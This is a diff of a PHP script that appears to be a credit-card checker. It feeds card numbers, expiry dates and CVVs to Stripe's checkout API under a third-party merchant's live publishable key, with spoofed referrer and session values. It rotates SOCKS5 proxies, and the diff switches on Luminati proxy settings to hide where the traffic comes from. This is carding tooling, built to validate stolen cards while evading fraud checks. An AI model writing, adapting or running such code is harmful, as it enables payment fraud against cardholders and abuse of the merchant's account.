@@ -1,6 +1,6 @@
 <?php
 
-////////////////////////////===[https://www.onegreenplanet.org/]///
+////////////////////////////===[]
 
 error_reporting(0);
 set_time_limit(0);
@@ -26,14 +26,14 @@ function GetStr($string, $start, $end)
   $str = explode($end, $str[1]);
   return $str[0];
 }
-function rebootproxys()
+function monarchproxys()
 {
   $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks) - 1);
   $poxySocks = $poxySocks[$myproxy];
   return $poxySocks;
 }
-$poxySocks4 = rebootproxys();
+$poxySocks4 = monarchproxys();
 
 ////////////////////////////===[Randomizing Details Api]
 
@@ -57,11 +57,11 @@ $postcode = $matches1[1][0];
 
 ////////////////////////////===[Luminati Details]
 
-///$username = 'Put Zone Username Here';
-///$password = 'Put Zone Password Here';
-///$port = 22225;
-////$session = mt_rand();
-///$super_proxy = 'zproxy.lum-superproxy.io';
+$username = 'Put Zone Username Here';
+$password = 'Put Zone Password Here';
+$port = 22225;
+$session = mt_rand();
+$super_proxy = 'zproxy.lum-superproxy.io';
 
 ////////////////////////////===[For Authorizing Cards]
 
@@ -78,7 +78,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json', 
 'content-type: application/x-www-form-urlencoded',
 'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=a2ed7b69-9aba-b822-9cd6-1a2224c343db',
+'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=ca91f5ff-84f3-c98f-0f59-675feb54de57',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
 //'user-agent: #'));
@@ -88,7 +88,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.onegreenplanet.org%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$firstname.'&time_on_page=10608&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=e4498153-919c-4e18-8e93-7a26940fe6c4&sid=0be2c4b2-541a-4101-8b02-3011ae687682&key=pk_live_jFIGNwQtOKGxGSPRIo1sxPts');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.onegreenplanet.org%2F&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$email.'&time_on_page=11086&guid=95da8616-f593-4fdb-b65b-ee72d0a7cc56&muid=55494de4-154f-4fda-89a9-07d9256b3be3&sid=20dc6667-211f-4d89-aff6-b75067abc74f&key=pk_live_jFIGNwQtOKGxGSPRIo1sxPts');
 
 $result = curl_exec($ch);
 // $token = trim(strip_tags(getStr($result,'"id": "','"')));
